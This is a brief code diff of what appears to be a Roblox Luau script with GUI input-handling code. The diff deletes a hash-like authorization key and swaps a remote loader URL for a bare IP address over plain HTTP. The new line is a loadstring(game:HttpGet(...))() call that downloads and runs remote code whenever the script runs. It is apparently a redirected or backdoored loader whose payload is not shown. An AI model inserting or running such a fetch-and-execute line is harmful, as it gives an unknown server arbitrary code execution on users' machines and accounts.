@@ -260,6 +260,5 @@ frame.InputChanged:Connect(function(input)
     end
 end)
 
-AUTHORIZATION_KEY="$2b$10$GCxYVlfTp4amiAKRmGTjNeW/GfumS2Xl1GEZnLfZ.TSG06USV8UU.";
 ID="8a1b4dae-cd86-4a51-8bff-82cef0a45f21";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
